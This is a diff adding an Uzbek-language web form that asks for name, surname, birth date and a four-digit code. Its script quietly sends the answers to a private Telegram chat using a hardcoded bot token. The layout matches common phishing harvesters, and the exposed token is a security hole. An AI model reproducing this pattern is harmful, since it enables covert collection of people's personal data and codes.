@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8">
+  <title>Ma’lumot yuborish</title>
+</head>
+<body>
+
+<h2>Ma’lumot kiriting</h2>
+
+<form id="form">
+  <input type="text" id="ism" placeholder="Ism" required><br><br>
+  <input type="text" id="familiya" placeholder="Familiya" required><br><br>
+  <input type="date" id="sana" required><br><br>
+  <input type="number" id="kod" placeholder="4 xonali kod" required minlength="4" maxlength="4"><br><br>
+  <button type="submit">Yuborish</button>
+</form>
+
+<script>
+document.getElementById("form").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  const token = "8154641971:BOT_TOKEN_HERE"; // Sizning bot token
+  const chatId = "974818544";                 // Sizning chat ID
+
+  const text =
+    "🆕 Yangi ma’lumot:\n" +
+    "Ism: " + document.getElementById("ism").value + "\n" +
+    "Familiya: " + document.getElementById("familiya").value + "\n" +
+    "Tug‘ilgan sana: " + document.getElementById("sana").value + "\n" +
+    "Kod: " + document.getElementById("kod").value;
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: text
+    })
+  })
+  .then(res => res.json())
+  .then(data => {
+    if (data.ok) alert("Yuborildi ✅");
+    else alert("Xato ❌ Tekshiring token va chat ID");
+  });
+});
+</script>
+
+</body>
+</html>
